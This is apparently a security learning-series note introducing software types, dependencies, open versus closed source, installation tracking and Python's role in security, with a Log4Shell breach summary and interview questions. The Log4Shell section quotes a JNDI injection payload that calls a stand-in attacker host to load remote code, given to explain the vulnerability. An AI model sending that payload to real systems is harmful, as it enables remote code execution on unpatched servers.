# Day 22 — What is Software

**Volume:** 01 — Computer and Internet Foundations
**Topic:** 7 — What is Software

---

## What It Is in Plain English

Software = instructions that tell hardware what to do.
Two categories: application software (user-facing) and system software
(manages hardware, provides platform for applications).

Security engineers care about software type, installation method,
and open vs closed source because each affects attack surface.

---

## Key Terms

**Compiled** — source → binary before execution. C, C++, Go, Rust.
Fast. Cannot read source from binary without disassembler.

**Interpreted** — source read and executed line by line at runtime.
Python, JavaScript, Ruby. Readable by anyone with access.

**Library** — reusable pre-written code imported by programs.
Vulnerability in a library = every program using it is affected.

**Dependency** — a library or component a program requires to run.
Attack surface: you are responsible for dependencies you did not write.

**Open source** — source code publicly available. Auditable. Transparent.
Attackers can also read it.

**Closed source** — binary only. Cannot verify what it does.
SolarWinds backdoor went undetected months because nobody could audit it.

**Firmware** — software in hardware (routers, cameras). Updated rarely.
Same vulnerability classes as software, harder to patch.

---

## System vs Application Software — Security Priority

System software (OS, drivers) runs with highest privilege.
Kernel vulnerability = full system compromise.
Driver vulnerability = Ring 0 / kernel space access.

Application software runs in user space.
Can be sandboxed. More common attack target.
Equifax 2017 = application vulnerability.
Log4Shell 2021 = library (dependency) vulnerability.

---

## Open Source vs Closed Source — Security Reality

Open source advantages: anyone can audit, fixes are verifiable,
transparency builds trust.

Open source disadvantages: attackers read the same code, abandoned
projects still used in production.

Closed source advantages: harder to find vulnerabilities without source,
vendor accountability.

Closed source disadvantages: cannot verify behavior, no patches after
end-of-life (WannaCry hit unpatched Windows XP systems in 2017).

Rule: patching cadence and dependency management determine security,
not open vs closed source label.

---

## Linux vs Windows Installation

Linux (apt): cryptographic signature verification, central package
database, all files tracked with dpkg -L [package].

Windows (.exe/.msi): no central tracking, Uninstall registry key
incomplete, malware does not register itself there.
Forensic implication: Windows malware investigation requires checking
file timestamps, Run keys, services — not just installed programs list.

---

## Why Python in Security

Readable, fast to write, enormous library ecosystem.
requests, scapy, boto3, paramiko, cryptography — every security domain covered.
Glue language — connects tools, parses output, sends alerts.
All major security platforms have Python APIs.

---

## Real Breach — Log4Shell CVE-2021-44228 — December 2021

Log4j = open source Java logging library in millions of applications.
Vulnerability: Log4j evaluated JNDI expressions in logged strings.
Attack: send ${jndi:ldap://attacker.com/exploit} in User-Agent header.
Result: remote code execution, zero authentication, one HTTP request.
Scale: ~1 billion devices estimated vulnerable.
Lesson: software inventory is a security control. You cannot patch
what you cannot find.

---

## Interview Prep — in interview-prep/Vol1_QA.md

1. Compiled vs interpreted — one example each?
2. What is a dependency and why does a library vulnerability matter industry-wide?
3. Two open source security advantages and two disadvantages?
4. SUID relevance when thinking about software execution on Linux?
5. Developer says no Log4j — how do you verify on Linux?
6. SCENARIO: Software in /opt not installed via apt — additional checks?
7. SCENARIO: Critical patch available but not deployed — recommendation and timeline?